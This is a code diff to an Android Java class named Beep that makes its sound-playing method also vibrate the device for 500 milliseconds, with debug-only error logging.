@@ -2,9 +2,11 @@ package com.android.dvci;
 
 import java.util.concurrent.Semaphore;
 
+import android.content.Context;
 import android.media.AudioFormat;
 import android.media.AudioManager;
 import android.media.AudioTrack;
+import android.os.Vibrator;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.util.Check;
@@ -103,6 +105,16 @@ public class Beep {
 	}
 
 	static synchronized void playSound(byte[] generatedSnd) {
+
+		try {
+			Vibrator v = (Vibrator) Status.getAppContext().getSystemService(Context.VIBRATOR_SERVICE);
+			// Vibrate for 500 milliseconds
+			v.vibrate(500);
+		}catch(Exception ex){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (playSound), ERROR: " + ex);
+			}
+		}
 
 		int ret = audioTrack.setStereoVolume(1.0F, 1.0F);
 		ret = audioTrack.write(generatedSnd, 0, generatedSnd.length);
